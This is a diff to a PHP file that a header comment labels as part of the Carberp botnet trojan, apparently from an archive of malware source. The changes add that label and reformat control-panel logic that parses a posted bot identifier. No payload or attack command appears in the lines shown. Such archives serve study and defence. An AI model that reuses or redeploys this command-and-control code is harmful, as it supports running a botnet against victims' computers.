@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
@@ -5,14 +16,18 @@ $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
 unset($_SESSION['gsearch']);
 
 if(!empty($_POST['uid'])){
-	if(!empty($_POST['uid'])){		preg_match('~^([a-zA-Z]+)(.*)~', $_POST['uid'], $matches);
+	if(!empty($_POST['uid'])){
+		preg_match('~^([a-zA-Z]+)(.*)~', $_POST['uid'], $matches);
 
-		if(!empty($matches[1])){			$prefix = $matches[1];
+		if(!empty($matches[1])){
+			$prefix = $matches[1];
 			$data = $matches[2];
-		}else{			$prefix = 'unknown';
+		}else{
+			$prefix = 'unknown';
 			$data = 'unknown';
 		}
-	}else{		$prefix = 'unknown';
+	}else{
+		$prefix = 'unknown';
 		$data = 'unknown';
 	}
 
